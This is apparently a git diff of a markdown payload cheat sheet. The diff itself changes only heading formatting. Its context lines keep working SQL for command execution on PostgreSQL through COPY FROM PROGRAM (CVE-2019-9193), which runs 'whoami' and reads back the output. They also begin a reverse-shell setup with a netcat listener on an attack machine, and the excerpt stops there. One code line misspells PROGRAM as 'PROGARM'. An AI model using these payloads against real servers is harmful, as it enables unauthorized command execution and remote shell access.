@@ -2,7 +2,7 @@
 Finally got tired of writing the same payloads over and over again.
 
 ## Postgres 9.3 > Latest Command Execution: CVE-2019-9193
-*Data Exfil via COPY FROM PROGARM and SELECT*
+**Data Exfil via COPY FROM PROGARM and SELECT**
 ```
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec(cmd_output text);
@@ -10,7 +10,7 @@ COPY cmd_exec FROM PROGARM 'whoami';
 SELECT * FROM cmd_exec;
 ```
 
-*Reverse Shell via COPY TO PROGRAM*
+**Reverse Shell via COPY TO PROGRAM**
 On attack machine tab1 (shell input):
 ```
 nc -lvp 4444
